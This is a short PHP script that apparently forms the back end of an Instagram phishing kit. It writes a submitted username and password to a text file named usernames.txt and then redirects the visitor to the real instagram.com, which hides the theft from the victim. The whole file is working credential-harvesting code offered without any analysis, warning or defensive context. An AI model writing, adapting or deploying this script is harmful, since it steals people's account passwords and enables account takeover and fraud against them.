<?php

file_put_contents("usernames.txt", "1738849393_: " . $_POST['1738849393_'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://instagram.com');
exit();
?>
